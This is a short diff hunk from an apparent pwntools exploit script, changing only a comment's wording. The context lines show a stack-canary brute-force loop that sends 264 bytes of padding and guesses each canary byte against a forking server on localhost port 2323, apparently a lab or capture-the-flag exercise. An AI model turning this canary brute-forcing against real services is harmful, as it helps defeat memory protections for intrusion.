@@ -11,7 +11,7 @@ padding = b'A' * 264
 for i in range(8):  # 8 bytes for the canary
     for j in range(256):  # all values for a byte
         r = remote('localhost', 2323)
-        # Maybe add short sleep here: otherwise, the child processes on the server are spawned so quick that the main memory runs full
+        # Maybe add short sleep here: otherwise, the child processes on the server are spawned so quickly that the main memory runs full
         # sleep(0.07)
 
         log.debug(f'Sending canary {canary.hex() + hex(j)}')
